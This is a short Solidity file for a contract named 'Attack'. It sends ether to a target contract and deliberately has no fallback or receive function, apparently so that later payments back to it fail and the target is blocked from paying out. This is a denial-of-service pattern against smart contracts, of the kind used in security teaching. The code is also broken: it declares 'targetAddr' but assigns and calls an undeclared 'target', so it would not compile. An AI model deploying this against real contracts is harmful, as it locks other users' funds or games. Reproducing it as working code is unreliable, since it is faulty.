// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract Attack {

    address payable targetAddr;

    constructor(address targetAddr) {
        target = payable(targetAddr);
    }

    function attack() payable public {
        (bool success, ) = target.call{value: msg.value}("");
        require(success, "tx failed");
    }
    
    // NO fallback() or receive() implemented
}
